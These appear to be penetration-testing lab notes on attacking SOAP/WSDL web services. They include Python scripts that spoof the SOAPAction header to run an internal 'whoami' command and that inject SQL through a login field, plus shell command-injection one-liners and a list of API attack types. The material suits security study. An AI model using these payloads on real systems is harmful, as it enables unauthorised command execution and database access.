Web Service Description Language (WSDL) Spoofing
---

This will fail because `ExecuteCommandRequest` is only allowed to be called internally

```
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

To by pass the check, we define the command to something that is allowed, such as `LoginRequest`, but the `SOAPAction` is still `ExecuteCommand`

```
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

SQL Injection via SOAP requests
---
```
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>admin\' and 1=1;-- - </username><password></password></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://10.129.202.133:3002/wsdl", data=payload, headers={"SOAPAction":'"Login"'}).content)
```

Command Injection
---

In Linux, backticks to execute command 

``ping google.com `id` ``

`;` to chain commands

`ping google.com; id`

API Attacks
---

- SQL Injection
- Arbitary File Upload to PHP Shell
- Local File Inclusion with Burp for Path Traversal
- Cross Site Scripting
- SSRF
- Regular Expression DoS
- XML External Entity Attacks
